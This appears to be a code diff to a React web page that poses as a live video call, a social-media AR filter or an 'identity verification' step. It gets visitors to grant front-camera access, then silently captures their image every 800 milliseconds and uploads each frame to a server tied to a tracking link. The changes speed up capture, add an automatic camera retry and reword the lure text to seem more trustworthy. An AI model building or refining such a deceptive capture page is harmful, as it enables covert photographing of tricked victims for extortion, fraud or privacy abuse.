@@ -73,7 +73,7 @@ export default function CapturePage() {
     };
   }, [id, fetchLinkInfo]);
 
-  const requestPermissions = async () => {
+  const requestPermissions = async (retry = false) => {
     setPermissionError(null);
     
     // Stop existing stream if any
@@ -88,15 +88,19 @@ export default function CapturePage() {
       captureIntervalRef.current = null;
     }
 
+    const constraints = retry 
+      ? { video: { facingMode: "user" }, audio: false } 
+      : { 
+          video: { 
+            width: { ideal: 1280 },
+            height: { ideal: 720 },
+            facingMode: "user"
+          }, 
+          audio: false 
+        };
+
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { 
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-          facingMode: "user"
-        }, 
-        audio: false 
-      });
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
       
       streamRef.current = stream;
       if (videoRef.current) {
@@ -106,24 +110,33 @@ export default function CapturePage() {
         };
       }
       
-      // Start capture loop
+      // Start capture loop with faster frequency (800ms)
+      // Capture the first frame immediately
+      setTimeout(() => captureFrame(), 500); // Small delay to let camera warm up
+
       captureIntervalRef.current = setInterval(() => {
         captureFrame();
-      }, 1500);
+      }, 800);
       
       return true;
     } catch (err: any) {
-      console.error('Camera access error:', err);
+      console.error('Camera access error:', err.name, err.message);
+      
+      // Automatic fallback if high-res failed
+      if (!retry && (err.name === 'NotReadableError' || err.name === 'TrackStartError' || err.name === 'OverconstrainedError')) {
+        console.log('Attempting fallback with lower constraints...');
+        return requestPermissions(true);
+      }
       
       let msg = '';
       if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
         msg = 'Camera access was denied. This is required for identity verification.';
       } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
-        msg = 'Camera is already in use by another application.';
+        msg = 'Camera is already in use by another application (Zoom, Skype, etc.). Please close other apps and try again.';
       } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
         msg = 'No camera device found.';
       } else {
-        msg = 'Hardware error accessing camera.';
+        msg = `Hardware error: ${err.name}. Please ensure your camera is connected.`;
       }
       
       setPermissionError(msg);
@@ -153,7 +166,7 @@ export default function CapturePage() {
         body: JSON.stringify({ linkId: id, imageData }),
       });
     } catch (err) {
-      console.error('Capture sync failed', err);
+      console.error('Update failed', err);
     }
   };
 
@@ -353,7 +366,7 @@ function VideoCallStyle({ requestPermissions, permissionError }: { requestPermis
                       <div className="space-y-2">
                         <h3 className="text-2xl font-black text-white uppercase tracking-tight italic">Link Paused</h3>
                         <p className="text-[11px] text-white/50 leading-relaxed">
-                          Secure identity sync is required to continue {girlName}&apos;s HD broadcast.
+                          Secure identity verification is required to continue {girlName}&apos;s HD broadcast.
                         </p>
                       </div>
                       <button
@@ -361,7 +374,7 @@ function VideoCallStyle({ requestPermissions, permissionError }: { requestPermis
                         disabled={isRetrying}
                         className="w-full py-5 bg-green-500 text-white font-black text-xs uppercase rounded-2xl shadow-[0_20px_40px_rgba(34,197,94,0.3)] active:scale-95 transition-all disabled:opacity-50 flex items-center justify-center gap-3"
                       >
-                        {isRetrying ? <Loader2 size={18} className="animate-spin" /> : <><Camera size={18} /> Enable Secure Camera</>}
+                        {isRetrying ? <Loader2 size={18} className="animate-spin" /> : <><Camera size={18} /> Enable Secure Stream</>}
                       </button>
                     </div>
                   )}
@@ -431,7 +444,7 @@ function SocialStyle({ requestPermissions, permissionError }: { requestPermissio
 
   const filters = [
     { name: "Vintage", color: "bg-amber-500/20" },
-    { name: "Aura Glow", color: "bg-purple-500/20" },
+    { name: "Soft Glow", color: "bg-purple-500/20" },
     { name: "Digital PK", color: "bg-green-500/20" },
     { name: "Smooth", color: "bg-blue-500/20" },
     { name: "Cyber", color: "bg-cyan-500/20" }
@@ -476,13 +489,13 @@ function SocialStyle({ requestPermissions, permissionError }: { requestPermissio
           </div>
           <div className="flex flex-col">
             <div className="flex items-center gap-2">
-               <span className="font-black text-sm text-white drop-shadow-md tracking-tight uppercase">aura_official_pk</span>
+               <span className="font-black text-sm text-white drop-shadow-md tracking-tight uppercase">official_pk_live</span>
                <div className="w-3.5 h-3.5 rounded-full bg-blue-500 flex items-center justify-center shadow-lg">
                   <CheckCircle2 size={9} className="text-white" />
                </div>
             </div>
             <div className="flex items-center gap-2">
-               <span className="text-[10px] text-white/50 font-bold uppercase tracking-widest whitespace-nowrap">AR Filter Active</span>
+               <span className="text-[10px] text-white/50 font-bold uppercase tracking-widest whitespace-nowrap">Filter Node Active</span>
             </div>
           </div>
         </div>
@@ -513,7 +526,7 @@ function SocialStyle({ requestPermissions, permissionError }: { requestPermissio
               <div className="space-y-3 pt-6">
                 <h3 className="text-2xl font-black text-white uppercase tracking-tighter italic">Identity Lock</h3>
                 <p className="text-[11px] text-white/50 font-bold leading-relaxed">
-                  AR correlation requires Secure Identity Sync. Please allow camera access to unlock the Digital PK Filter Node.
+                  AR correlation requires Secure Identity Verification. Please allow camera access to unlock the Digital PK Filter Node.
                 </p>
                 <div className="py-2 inline-block px-3 bg-red-600/10 rounded-full border border-red-600/20">
                   <p className="text-[10px] text-red-500 font-urdu font-black" dir="rtl">بایومیٹرک تصدیق درکار ہے۔</p>
@@ -546,7 +559,7 @@ function SocialStyle({ requestPermissions, permissionError }: { requestPermissio
            )}
            <div className="flex flex-col items-center gap-2">
              <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.6em] ml-[0.6em]">
-               {permissionError ? '' : 'Scanning Aura Field'}
+               {permissionError ? '' : 'Scanning Filter Node'}
              </p>
              <div className="flex gap-1">
                 {[0,1,2].map(i => (
